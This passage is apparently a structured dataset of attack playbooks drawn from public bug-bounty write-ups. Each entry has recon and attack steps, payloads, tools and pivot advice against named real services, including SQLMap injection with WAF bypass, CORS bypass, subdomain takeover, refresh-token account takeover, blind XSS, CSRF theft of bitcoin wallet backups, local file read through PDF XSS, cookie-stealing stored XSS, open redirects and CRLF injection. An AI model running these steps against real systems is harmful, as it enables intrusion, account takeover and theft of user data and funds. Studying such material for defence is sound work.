Step 2: Navigate to '/forumrunner/request.php?d=1&cmd=get_spam_data&postids=1' and observe the HTTP response. A successful response might indicate the presence of the vulnerable module.
attack_steps: Step 1: Send a GET request to '/forumrunner/request.php?d=1&cmd=get_spam_data&postids=1'. Observe the response for any SQL errors, which indicates potential SQL injection vulnerability.

Step 2: If SQL errors are observed, use a SQL injection tool like SQLMap. Attempt to bypass any Web Application Firewall (WAF) by using the backend server's IP address directly if obtainable (e.g., via external services like Censys).

Step 3: Execute SQLMap with the following command: sqlmap -u "<TARGET_URL>/forumrunner/request.php?d=1&cmd=get_spam_data&postids=1*" --random-agent -threads=10 --level=5 --dbs. The '*' is a placeholder for SQLMap to append its payloads.

Step 4: If SQLMap successfully identifies databases, proceed with further enumeration to extract sensitive information. If a WAF blocks direct attacks on the domain, use the IP address obtained through reconnaissance.
tools_recommended: SQLMap: For automated SQL injection detection and exploitation, including WAF bypass techniques.
Censys.io: To potentially find the backend IP address of the target server to bypass WAFs.
success_indicators: An SQL error is thrown when requesting '/forumrunner/request.php?d=1&cmd=get_spam_data&postids=1'.
SQLMap successfully lists databases on the site when attacking the backend IP address.
failure_indicators: No SQL errors observed for the initial test payload. → Investigate other vulnerable endpoints or modules.
WAF blocks SQLMap payloads on the domain name. → Attempt to find the server's IP address via external services and attack it directly.
SQLMap returns no results even when attacking the IP address. → The application might have been patched or the vulnerability is not present on this specific instance.

playbooks.impact: Attacker can extract all databases from the site, leading to the compromise of sensitive user data and application information.
playbooks.key_lesson: Always test input parameters in modules known to be vulnerable, even if sanitization functions appear to be in place. Consider WAF bypass techniques by targeting the server's IP address directly if domain-based attacks are blocked.

meta.title: Tricky CORS Bypass in Yahoo! View

trigger_conditions.when_to_apply: When an application improperly handles the 'Origin' header in CORS requests, allowing arbitrary origins to be reflected in the 'Access-Control-Allow-Origin' header, especially when 'Access-Control-Allow-Credentials' is set to 'true'.
prerequisites: Attacker has an authenticated session with the target application (e.g., view.yahoo.com).
applicability_signals: CORS policy is enabled and the server reflects the 'Origin' header in 'Access-Control-Allow-Origin'.
'Access-Control-Allow-Credentials' is set to 'true' in the response.
skip_if: The server strictly validates the 'Origin' header and does not reflect arbitrary values.
'Access-Control-Allow-Credentials' is not set to 'true'.

recon_steps: Step 1: Browse https://view.yahoo.com and perform various actions to trigger API calls.
Step 2: Analyze network traffic using Burp Suite to identify API endpoints and CORS configurations.
Step 3: Observe the 'Access-Control-Allow-Origin' and 'Access-Control-Allow-Credentials' headers in responses from api.view.yahoo.com.
attack_steps: Step 1: Send a GET request to 'https://api.view.yahoo.com/api/session/preferences' with the 'Origin' header set to 'https://view.yahoo.com'. Observe the response.
Step 2: Attempt to inject a malicious origin by sending 'https://view.yahoo.com.corben.io'. Observe the response.
Step 3: Attempt to inject a malicious origin by sending 'https://view.yahoo.com corben.io' (with a space). Observe the response.
Step 4: Attempt to inject a malicious origin by sending 'https://view.yahoo.com%corben.io' (URL-encoded space). Observe the response.
Step 5: Based on known bypass techniques, attempt to inject a URL-encoded backtick followed by a controllable domain, e.g., 'https://view.yahoo.com%60cdl.corben.io'. Observe the response.
Step 6: Set up a simple HTTP server on a domain like 'cdl.corben.io' to host an exploit page.
Step 7: Visit the crafted URL (e.g., 'http://view.yahoo.com%60cdl.corben.io') in a compatible browser (Safari on Mac in this case) to trigger the exploit and load the attacker's content.
tools_recommended: Burp Suite (for traffic analysis and request modification)
curl (for testing specific requests)
Node.js (for setting up a simple exploit server)
success_indicators: The 'Access-Control-Allow-Origin' header in the response includes the attacker-controlled origin (e.g., 'http://view.yahoo.com%60cdl.corben.io').
The attacker's exploit page loads in the victim's browser when they navigate to a crafted URL.
failure_indicators: The 'Access-Control-Allow-Origin' header does not reflect the injected origin or remains 'https://view.yahoo.com'.
The browser throws a CORS error or the exploit page does not load.
Apache server errors prevent the exploit from functioning.

playbooks.impact: An attacker can potentially steal sensitive API data that is intended to be accessed only by the legitimate origin (https://view.yahoo.com) by tricking the browser into making cross-origin requests to the attacker's controlled domain.
playbooks.key_lesson: When testing CORS, always attempt to inject different origin formats, including those with special characters and URL encodings, to identify bypasses, especially when 'Access-Control-Allow-Credentials' is true.

meta.title: Image removal vulnerability in Facebook polling feature

trigger_conditions.when_to_apply: When the Facebook polling feature allows associating images with poll options, and these associations are managed via image IDs that can be manipulated.
prerequisites: Attacker must have an authenticated Facebook account.
applicability_signals: The polling feature is active and allows image uploads or associations.
Developer tools show requests containing `poll_question_data[options][][associated_image_id]` or similar parameters during poll creation.
skip_if: The polling feature does not support image associations.
Image IDs are not exposed or are server-side generated and validated against the user's ownership.

recon_steps: Step 1: Create a new poll with an image using an authenticated account. Observe the network requests in browser developer tools, specifically looking for the parameter that holds the associated image ID.
Step 2: Attempt to identify if image IDs are sequential or predictable. If possible, try to enumerate or guess image IDs.
attack_steps: Step 1: Create a poll and upload an image. Capture the request that submits the poll data.
Step 2: Identify the `poll_question_data[options][][associated_image_id]` parameter (or similar) and its value (the attacker's image ID).
Step 3: In the captured request, replace the attacker's image ID with the image ID of an image uploaded by another user.
Step 4: Resend the modified request to create the poll.
Step 5: Verify that the poll now displays the other user's image.
Step 6: Attempt to delete the poll and observe if the other user's image is also deleted as a consequence.
tools_recommended: Burp Suite: To intercept, modify, and resend HTTP requests, and to observe network traffic.
Browser Developer Tools: For inspecting network requests and responses.
success_indicators: A poll is successfully created and displays an image uploaded by another user.
Deleting the poll results in the deletion of the other user's associated image.
failure_indicators: The request to create the poll fails with an error indicating an invalid image ID.
The poll is created but still displays the attacker's original image, suggesting image ID validation.
Attempting to delete the poll only removes the attacker's image, not the other user's.

playbooks.impact: An attacker can associate another user's uploaded image with their poll, potentially leading to unauthorized content display. Deleting the poll would also delete the victim's image, causing data loss for the victim.
playbooks.key_lesson: Always test for IDOR vulnerabilities on any resource identifier (like image IDs) used in web application features, especially when those resources can be associated with user-generated content or actions.

meta.title: UBER Wildcard Subdomain Takeover

trigger_conditions.when_to_apply: When a subdomain is found to be resolving to a wildcard DNS entry, such as *.herokudns.com, indicating it may be vulnerable to takeover.
prerequisites: An attacker must have a Heroku account.
applicability_signals: Subdomain returns an error and resolves to *.herokudns.com.
skip_if: The subdomain is actively managed and not pointing to a wildcard DNS service that can be claimed.

recon_steps: Step 1: Scan for subdomains of the target domain (e.g., uber.design).
Step 2: Manually visit identified subdomains to check for errors or unexpected behavior.
Step 3: For subdomains showing errors, check their DNS resolution. If they resolve to a known wildcard service like *.herokudns.com, proceed.
attack_steps: Step 1: Log in to a Heroku account.
Step 2: Create a new Heroku application.
Step 3: Add the vulnerable subdomain (e.g., www.mobile.uber.design) to the domain list of the newly created Heroku app.
Step 4: Observe the subdomain's resolution. The error should disappear, and it should now point to the attacker-controlled Heroku app.
payloads_or_patterns: Vulnerable subdomain pattern: subdomain.uber.design pointing to *.herokudns.com
tools_recommended: Subdomain enumeration tools (e.g., Sublist3r, Amass)
DNS lookup tools (e.g., `dig`, `nslookup`)
Heroku CLI or Web Interface
success_indicators: The previously erroring subdomain now resolves to the attacker's Heroku application or displays a default Heroku page.
The subdomain is successfully added to the attacker's Heroku app's domain list.
failure_indicators: The subdomain continues to show an error or resolve to an unexpected IP after attempting to claim it on Heroku. This might indicate the DNS record was not a wildcard or has been recently reconfigured.
Heroku rejects adding the domain to the app, possibly due to existing ownership or configuration issues.

playbooks.impact: Attacker can host arbitrary content on the compromised subdomain, potentially leading to phishing, hosting malicious websites, or misleading users. The writeup also suggests that with wildcard DNS, an attacker could potentially claim subdomains that are verified for Google G-suite, allowing them to send and receive emails as an employee of the target organization (e.g., [email protected]).
playbooks.key_lesson: Always investigate subdomains that resolve to wildcard DNS services (like *.herokudns.com) as they are prime candidates for subdomain takeover vulnerabilities.

meta.title: JWT Refresh Token Manipulation

tech_stack_fingerprints: Response contains JSON with access_token and refresh_token fields

trigger_conditions.when_to_apply: When an application issues both access tokens and refresh tokens, and the authorization server does not properly associate refresh tokens with the access token's user context.
prerequisites: Attacker must have a valid, potentially expired, access token of a victim.
Attacker must have obtained a valid refresh token (e.g., from a test account or another compromised session).
applicability_signals: Application returns a JSON response containing both `access_token` and `refresh_token` upon successful authentication or token refresh.
The `/auth/refresh` endpoint is discoverable or implied by the authentication flow.
skip_if: Authorization server strictly validates the `refresh_token` against the `access_token`'s associated user.
Refresh tokens are single-use and are invalidated after one use.
Access tokens have a very short lifespan and refresh tokens are not discoverable or obtainable by the attacker.

recon_steps: Step 1: Authenticate as a regular user and capture the response containing both `access_token` and `refresh_token`.

Step 2: Identify the endpoint used for refreshing tokens (e.g., `/auth/refresh`). Observe the request format, typically including the current `access_token` in the Authorization header and the `refresh_token` in the request body (e.g., JSON).
attack_steps: Step 1: Obtain a valid refresh token from a source controllable by the attacker (e.g., by registering a test account and obtaining its refresh token).
Step 2: Capture a victim's valid (or recently expired) access token.
Step 3: Send a POST request to the refresh token endpoint.
Step 4: Set the `Authorization` header with the victim's `access_token` (e.g., `Bearer <VICTIM_ACCESS_TOKEN>`).
Step 5: In the request body, provide the attacker's obtained `refresh_token` (e.g., `{"refresh_token": "<ATTACKER_REFRESH_TOKEN>"}`).
payloads_or_patterns:
POST /auth/refresh HTTP/1.1
Host: <TARGET_HOST>
Content-Type: application/json
Authorization: Bearer <VICTIM_ACCESS_TOKEN>

{"refresh_token": "<ATTACKER_REFRESH_TOKEN>"}
tools_recommended: Burp Suite: To intercept and modify token refresh requests, and to capture tokens from different sessions.
success_indicators: The response contains a new, valid `access_token` and `refresh_token` that are associated with the victim's account, not the attacker's account. This new access token can be used to access victim-specific resources.
failure_indicators: The server returns an error indicating the refresh token is invalid, expired, or not associated with the provided access token. Pivot: Investigate if refresh tokens are single-use, or if there are other ways to obtain a victim's refresh token.

playbooks.impact: An attacker can obtain a valid, long-lived access token for a victim's account by using their own refresh token. This allows the attacker to impersonate the victim and access their data or perform actions on their behalf, effectively achieving account takeover.
playbooks.key_lesson: Ensure the authorization server strictly validates that a refresh token belongs to the user associated with the access token being refreshed.

meta.title: How signing up for an account with an @company.com email can have unexpected results

trigger_conditions.when_to_apply: When a web application allows users to sign up with an email address from a specific domain (e.g., @company.com) and does not immediately verify the email ownership, while also providing a mechanism to change the account's email address after initial creation.
prerequisites: The target application allows account creation with an email address from a specific domain (e.g., @company.com).
The application does not immediately verify email ownership upon account creation.
The application has a feature to change the account's email address.
The application sends an email verification link to the email address associated with the organization for joining/claiming.
The application allows the user to change their account email *before* submitting the claim/verification.
applicability_signals: Ability to sign up with an arbitrary email address (e.g., `attacker@company.com`).
The organization joining/claiming process presents a 'Claim' or 'Submit' button after entering an organization-specific email.
User account settings allow changing the primary email address.
Email verification links are sent for organizational claims/joins.
skip_if: Email is verified immediately upon signup.
The email change functionality is not available.
The verification link is tied to the initial email and cannot be used after an email change.
The application strictly enforces email verification before allowing any further actions.

recon_steps: Step 1: Browse the target application and identify the organization signup or joining flow. Look for fields requiring an organization-specific email (e.g., `user@targetcompany.com`).
Step 2: Attempt to sign up with a valid `@company.com` email address. Observe if immediate email verification is required.
Step 3: Once an account is created with a `@company.com` email, navigate to account settings and check for an option to change the account's email address.
attack_steps: Step 1: Sign up for an account using an email address from the target organization's domain (e.g., `attacker@company.com`).
Step 2: Initiate the process to join or claim an organization, providing the attacker-controlled `@company.com` email.

Step 3: After being presented with a 'Claim' or 'Submit' button for verification, navigate to the account settings and change the account's primary email address to one controlled by the attacker (e.g., `attacker_personal@gmail.com`).
Step 4: Return to the organization claim/join screen and press the 'Submit' button.
Step 5: Check the attacker-controlled email (`attacker_personal@gmail.com`) for a verification email related to joining the organization.
Step 6: Before clicking the verification link in the email, change the account's primary email address *back* to the organization's domain email (`attacker@company.com`).
Step 7: Click the verification link received in the attacker-controlled email. This link should now be processed with the attacker's current account email set to `attacker@company.com`.
tools_recommended: Burp Suite: To intercept and modify email addresses during account settings changes and to observe network traffic for verification link patterns.
Mailinator/Disposable Email Services: To receive verification emails if a personal controlled email is not desired or feasible.
success_indicators: Successful verification of membership to the organization, granting access to organization-specific features.
Response indicating successful organization claim/join without requiring ownership of the original `@company.com` email.
Ability to perform actions within the organization that were previously restricted.
failure_indicators: Verification link fails with an error stating the email cannot be used with the organization after changing it back.
The system requires re-verification of the *new* attacker-controlled email after the change.
403 Forbidden or similar errors when attempting to access organization resources after the process.

playbooks.impact: Attacker gains unauthorized access to an organization's account or resources within the application by impersonating an employee. This could lead to data breaches, manipulation of organization settings, or further exploitation of internal systems.
playbooks.key_lesson: When applications allow account creation with domain-specific emails and have a sequential verification process with email change capabilities, always test the order of operations: sign up with target domain email, initiate verification, change account email to attacker-controlled, submit verification, then change account email back to target domain email before clicking the verification link.

meta.title: How I Pwned a company using IDOR & Blind XSS

tech_stack_fingerprints: Existence of /api/param endpoint, response Content-Type: application/json or text/javascript, X-Requested-With: XMLHttpRequest header

trigger_conditions.when_to_apply: When a system allows viewing support tickets via an API endpoint with a predictable or discoverable ticket ID, and has a blind XSS vulnerability on an internal domain accessible by support staff.
prerequisites: Attacker can send an email to the support address.
Support staff view tickets on an internal domain.
The target system uses a ticket ID that can be manipulated or discovered.
applicability_signals: A GET request to /api/param?param=<TICKET_ID> returns ticket details.
An XSS payload in an email to support triggers on the internal domain when a ticket is viewed.
The DOM captured by XSS Hunter contains ticket IDs.
skip_if: Ticket IDs are cryptographically random and unguessable.
No observable XSS vulnerability in the internal ticket management interface.
Support tickets are not accessible via an API or predictable ID.

recon_steps: Step 1: Investigate the support portal for ticket creation via email and observe the format of ticket IDs in responses or URLs.

Step 2: Test for XSS vulnerabilities by sending various payloads in emails to the support address and monitor for callbacks (e.g., using XSS Hunter). Pay close attention to the internal domain where support staff manage tickets.
Step 3: Identify the specific API endpoint used to view support tickets and analyze its parameters for the ticket ID.
attack_steps: Step 1: Initiate a password reset for a service integrated with the company's systems (e.g., Slack) to generate a ticket or relevant email.
Step 2: Immediately after step 1, send an email with a Blind XSS payload to the company's support email address, ensuring it relates to the initiated reset (if possible) or is a general test.
Step 3: Wait for the Blind XSS to trigger on the internal domain. Use XSS Hunter to capture the DOM, which should contain the Ticket ID generated in Step 1.

Step 4: Use the discovered Ticket ID to query the IDOR-vulnerable API endpoint (e.g., GET /api/param?param=<TICKET_ID>) to retrieve sensitive information from the ticket, such as registration links for company services.
payloads_or_patterns: Blind XSS payload for email (e.g., `` - where xss.example.com is XSS Hunter)
tools_recommended: XSS Hunter for blind XSS payload delivery and DOM capture
Burp Suite for intercepting and modifying HTTP requests
success_indicators: XSS Hunter receives a callback and provides a DOM snapshot containing a valid Ticket ID.
The API request with the discovered Ticket ID returns a 200 OK status code and displays sensitive information from the ticket (e.g., Slack channel registration links).
failure_indicators: No XSS callback received → Try different XSS payloads or confirm the internal domain is accessible by support.
API returns 404 or 403 → The ticket ID is incorrect, invalid, or the endpoint has been patched. Try to find other ticket IDs or alternative IDOR vectors.
API returns ticket details but they are generic/uninteresting → The targeted ticket did not contain sensitive information. Repeat with a different service's password reset.

playbooks.impact: Access to sensitive company information, including registration links for multiple Slack channels. Potential for further account compromise through access to internal services.
playbooks.key_lesson: Chain vulnerabilities: IDOR and Blind XSS can be combined to bypass access controls and exfiltrate sensitive data from internal systems.

meta.title: Stealing bitcoin wallet backups from blockchain.info

trigger_conditions.when_to_apply: When the target application allows storing wallet backups to third-party services like Google Drive and lacks proper CSRF protection on the callback endpoint.
prerequisites: Attacker has an authenticated blockchain.info account.
Attacker has a Google account to receive the stolen backup.
applicability_signals: The endpoint `https://blockchain.info/wallet/gdrive-update` is identified.
The absence of a CSRF token is observed in requests related to the Google Drive backup feature.
skip_if: The `gdrive-update` endpoint is protected by CSRF tokens.
The `gdrive-update` endpoint requires additional authentication or parameters not controllable by the attacker.

recon_steps: Step 1: Authenticate to blockchain.info with your own account.
Step 2: Initiate the wallet backup process and select Google Drive as the storage option.
Step 3: Intercept the network traffic during the Google Drive authorization and callback process.
Step 4: Analyze the redirect URI for the `gdrive-update` endpoint to identify the `code` parameter and check for the presence of CSRF tokens.
attack_steps: Step 1: Authenticate your Google account with blockchain.info to obtain a valid Google Drive token.
Step 2: Craft a malicious URL using your Google Drive token: `https://blockchain.info/wallet/gdrive-update?code=<ATTACKERS_GDRIVE_TOKEN>`.
Step 3: Create an HTML page that includes an invisible iframe pointing to the crafted malicious URL.
Step 4: Trick a victim into visiting the HTML page while they are logged into their blockchain.info account.

Step 5: The victim's browser will load the iframe, triggering the `gdrive-update` endpoint with the attacker's Google Drive token, causing the wallet backup to be saved to the attacker's Google Drive.
tools_recommended: Burp Suite or OWASP ZAP: To intercept and analyze HTTP requests, and identify missing CSRF tokens.
A simple web server (e.g., Python's http.server) or a static HTML file: To host the clickjacking payload.
success_indicators: The victim's bitcoin wallet backup JSON file appears in the attacker's Google Drive account.
The attacker can import the stolen JSON file into blockchain.info to access the victim's bitcoins.
failure_indicators: The `gdrive-update` endpoint returns an error indicating an invalid or missing token, or a CSRF token mismatch.
The wallet backup is not saved to the attacker's Google Drive. Pivot: Investigate other integration points or storage options for similar vulnerabilities.

playbooks.impact: An attacker can steal unencrypted bitcoin wallet backup files from any authenticated blockchain.info user, leading to the complete loss of the victim's bitcoins.
playbooks.key_lesson: Always implement and validate CSRF tokens on all callback URLs and state-changing operations, especially those involving third-party integrations.

meta.title: Local File Read via XSS in Dynamically Generated PDF

tech_stack_fingerprints: PDF documents containing reflected user input

trigger_conditions.when_to_apply: When a web application generates PDF documents dynamically and reflects user-controlled input within the PDF content without proper sanitization.
prerequisites: Attacker must have an authenticated session.
applicability_signals: Endpoint that generates downloadable PDFs.
User input parameters reflected in the PDF content.
PDF viewer on the server-side capable of interpreting embedded HTML/JavaScript.
skip_if: PDF generation is fully sanitized and does not render HTML/JS.
The PDF viewer runs in a restricted sandbox with no access to the local filesystem.

recon_steps: Identify endpoints that generate downloadable documents (e.g., PDFs).
Analyze the parameters of these endpoints to find those reflected in the document content.
attack_steps: Step 1: Craft an HTML/JavaScript payload to inject into a reflected parameter (e.g., 'utrnumber'). Start with simple HTML tags to confirm reflection.
Step 2: If HTML renders, try injecting JavaScript using constructs like `<script>` tags or `onerror` events.
Step 3: Monitor the execution context of the JavaScript. If it reveals a `file://` origin on the server, proceed.
Step 4: Use `XMLHttpRequest` within the JavaScript payload to attempt reading local files (e.g., `/etc/passwd`).
Step 5: Observe the response to determine if the file content is successfully retrieved and displayed within the PDF.
tools_recommended: Burp Suite: To intercept and modify requests, specifically the parameter values for PDF generation.
Browser Developer Tools: To analyze the downloaded PDF if possible, though the primary execution is server-side.
success_indicators: The PDF content displays output from the injected JavaScript (e.g., 'aaaa' or file contents).
When attempting to read `/etc/passwd`, the response within the PDF contains the content of the `/etc/passwd` file.
failure_indicators: HTML/JavaScript is not rendered in the PDF (input is sanitized).
JavaScript execution context is not `file://` or is restricted.
`XMLHttpRequest` requests to `file://` URIs fail or return errors.
WAF blocks the malicious payloads.

playbooks.impact: Attacker can read arbitrary files from the server's local filesystem via the PDF generation endpoint, potentially leading to the disclosure of sensitive information (e.g., configuration files, user data, system credentials).
playbooks.key_lesson: When user input is reflected in server-generated documents (like PDFs), always test for HTML/JavaScript injection and verify the execution context to detect potential LFI or other vulnerabilities.

meta.title: Get your Microsoft account hijacked by simply clicking connect button

trigger_conditions.when_to_apply: When an authenticated user can edit their profile and add social media links.
prerequisites: The target user must be authenticated on Microsoft Social.
applicability_signals: The presence of social media profile fields (e.g., Facebook, Twitter, LinkedIn) on the user profile edit page.
The ability to modify these social media profile URLs.
skip_if: The social media profile URL field performs robust server-side validation that prevents injection of malicious JavaScript.
The application uses a Content Security Policy (CSP) that strictly forbids inline scripts and external script sources in the context of profile updates.

recon_steps: Navigate to the user profile editing page (e.g., https://social.microsoft.com/Profile/u/edit).
Observe the available social media link fields (e.g., Facebook, Twitter, LinkedIn).
attack_steps: Step 1: Authenticate as a victim user and navigate to the profile edit page.
Step 2: Intercept the POST request sent when submitting the profile changes using a proxy like Tamper Data or Burp Suite.
Step 3: Locate the parameter corresponding to the social media link (e.g., `SocialLink_Facebook`).
Step 4: Replace the legitimate social media URL with the crafted XSS payload. The payload should be designed to redirect the user to an attacker-controlled server and exfiltrate cookies.
Step 5: Submit the modified request.
Step 6: The malicious script is now stored on the victim's profile. When another user views the victim's profile and clicks on the compromised social media link, the XSS payload will execute.
Step 7: The executed payload will redirect the victim to an attacker-controlled site, sending their session cookies via a GET request.
tools_recommended: Burp Suite (Proxy, Repeater)
Tamper Data (Firefox Add-on)
success_indicators: The attacker's web server receives a GET request containing the victim's session cookies.
The victim is redirected to the attacker's specified URL after clicking the social media link.
failure_indicators: The application rejects the malicious payload with an error message indicating invalid input.
The social media link is displayed as entered without executing the JavaScript, suggesting sanitization or encoding.
No cookies are received by the attacker's server when a user clicks the link, indicating the payload was not executed.

playbooks.impact: An attacker can hijack user sessions by stealing session cookies, leading to full account takeover of the victim's Microsoft account and connected services (e.g., Outlook).
playbooks.key_lesson: Always perform server-side validation on user-supplied URLs, especially for social media links, to prevent the injection of malicious JavaScript payloads that can lead to session hijacking.

meta.title: Multiple Intel Vulnerabilities

trigger_conditions.when_to_apply: When a URL parameter is used for redirection and lacks proper validation, or when an index of files is exposed publicly.
prerequisites: The target must have an endpoint that accepts a URL parameter for redirection.
The target must have a directory that is not protected and lists its contents.
applicability_signals: The presence of parameters like `url=` in URLs related to external links or redirects.
The presence of directory paths that might list files, such as `/public/`.
skip_if: All redirection parameters are properly validated against a whitelist.
Directory listing is disabled for all public directories.

recon_steps: Scan the target domain for common redirection endpoints and identify any parameters that appear to control redirect URLs.
Browse directories on the target domain, specifically looking for patterns that might expose file listings (e.g., `/public/`, `/downloads/`).
attack_steps: Step 1: Send a GET request to `https://communities.intel.com/terms-and-conditions!input.jspa?url=http://evilsite.com` and observe the redirection.
Step 2: Send a GET request to `https://<private>.intel.com/external-link.jspa?url=http://evilsite.com` and observe the redirection.
Step 3: Attempt to access the directory `https://downloads.hpdd.intel.com/public/e2fsprogs/1.41.90.wc2/x86_64/el6` and check if a file index is displayed.
tools_recommended: Burp Suite: To intercept and modify requests, test different redirect URLs.
DirBuster/Gobuster: To discover hidden or unprotected directories.
success_indicators: Successful redirection to the attacker-controlled domain specified in the `url` parameter.
An index of files and subdirectories is displayed at the target URL, allowing browsing and potential download of files.
failure_indicators: A 404 Not Found error or a security warning page instead of redirection. Try different redirection parameters or encoding.
A 'Forbidden' error (403) or a blank page indicates directory listing is disabled or the path is incorrect. Try other potential directory paths.

playbooks.impact: Attackers can redirect users to malicious websites, potentially leading to phishing attacks or credential theft. Attackers can access and download sensitive files from exposed directories.
playbooks.key_lesson: Always validate URL parameters used for redirection against a whitelist and ensure directory listings are disabled for sensitive or public-facing directories.

meta.title: Non-persistent XSS at Microsoft

trigger_conditions.when_to_apply: When a search functionality on a Microsoft domain does not properly sanitize user input in the query parameter.
applicability_signals: The /en-us/research/search/ endpoint is accessible.
The URL contains a 'q=' parameter.
skip_if: The 'q=' parameter is strictly sanitized, blocking script tags.
The search endpoint returns a 404 or other error for unexpected inputs.

recon_steps: Step 1: Navigate to https://www.microsoft.com/en-us/research/search/?q=. Observe the presence of the 'q=' parameter in the URL.
Step 2: Submit a simple string like 'test' to the search query and observe the URL and response to confirm it's reflected.
attack_steps: Step 1: Construct a URL with the vulnerable parameter: https://www.microsoft.com/en-us/research/search/?q=<script>prompt(document.domain)</script>
Step 2: Visit the constructed URL in a web browser.
Step 3: Observe if the JavaScript payload executes.
tools_recommended: Browser: for manual testing and observation
Burp Suite: to capture and modify requests
success_indicators: A JavaScript prompt box appears displaying 'www.microsoft.com'.
The payload execution is visible in the browser's developer console without errors.
failure_indicators: No prompt box appears, and the input is displayed literally in the response or filtered.
A WAF block page or a 403 Forbidden error is returned.
Search results page shows no signs of script execution.

playbooks.impact: An attacker can craft a malicious URL that, when visited by a logged-in Microsoft user, can execute arbitrary JavaScript in the context of the user's session. This can lead to session hijacking (cookie stealing), account takeover, or performing actions on behalf of the user.
playbooks.key_lesson: Always test URL parameters, especially search queries, for XSS vulnerabilities by injecting JavaScript payloads. Pay close attention to parameters that reflect user input back into the page without proper sanitization.

meta.title: CRLF injection in blockchain.info

trigger_conditions.when_to_apply: When an API endpoint reflects URL parameters into response headers, specifically looking for parameters that can be manipulated to inject CRLF characters.
prerequisites: The target must have an API endpoint that accepts URL parameters.
The target must reflect at least one of these parameters in the HTTP response headers.
applicability_signals: A parameter in the URL (e.g., 'lang') is reflected in a response header (e.g., 'content-language').
skip_if: No reflection of URL parameters in response headers observed.
Input sanitization prevents CRLF injection (e.g., URL encoding of %0D%0A is not processed as CRLF).

recon_steps: Step 1: Identify API endpoints that accept parameters and return data.
Step 2: Observe response headers for reflection of input parameters. For example, check `content-language` after changing the `lang` parameter.
attack_steps: Step 1: Send a GET request to an identified endpoint with a parameter that is reflected in headers, e.g., `https://api2.blockchain.info/charts/total-bitcoins?cors=true&format=csv&lang=en`.
Step 2: URL-encode CRLF characters (`%0D%0A`) and append them to the parameter value. Send a request like: `https://api2.blockchain.info/charts/total-bitcoins?cors=true&format=csv&lang=en%0ATEST`.
Step 3: Observe the response headers for the injected header (e.g., `TEST`).

Step 4: Inject additional headers to achieve a specific impact, such as XSS.
